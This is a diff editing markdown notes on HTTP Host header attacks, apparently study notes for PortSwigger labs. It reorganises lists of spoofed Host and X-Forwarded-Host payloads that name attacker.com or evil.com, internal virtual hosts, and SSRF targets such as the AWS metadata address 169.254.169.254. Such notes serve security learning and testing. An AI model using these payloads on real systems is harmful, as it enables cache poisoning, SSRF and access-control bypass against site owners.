@@ -456,6 +456,7 @@ X-Host: attacker.com
 X-Forwarded-Server: attacker.com
 X-HTTP-Host-Override: attacker.com
 Forwarded: host=attacker.com
+Host: internal.target.local
 ```
 Based on your GitHub lab on [HTTP Host Header Attacks](https://github.com/Anvesh464/Portswigger-Labs/tree/main/20%20-%20HTTP%20Host%20header%20attacks), here's a **step-by-step breakdown** for each attack scenario from the PortSwigger labs.
 
@@ -480,19 +481,12 @@ Based on your GitHub lab on [HTTP Host Header Attacks](https://github.com/Anvesh
 - Leverage **proxy headers**: Some WAFs ignore `X-Forwarded-Host`
 
 ---
-
 # 📌 **2.1 Basic Manipulation Payloads**
 
 ```
-Host: evil.com
-```
-
-```
-Host: attacker.com
-```
-
-```
 Host: fake.target.com
+Host: evil,parent.com
+Host: evil.com:8080
 ```
 
 ---
@@ -509,18 +503,6 @@ Content-Type: application/json
 
 ---
 
-# 📌 **2.3 Open Redirect / URL Confusion**
-
-```
-Host: evil.com:8080
-```
-
-```
-Host: legit.com.evil.com
-```
-
----
-
 # 📌 **2.4 SSRF Using Host Header**
 
 ```
@@ -533,22 +515,6 @@ Host: 169.254.169.254   # AWS metadata
 
 ```
 Host: localhost
-```
-
----
-
-# 📌 **2.5 Admin Panel / VHost Bypass**
-
-```
-Host: admin.target.com
-```
-
-```
-Host: internal.target.local
-```
-
-```
-Host: staging.target.com
 ```
 
 ---
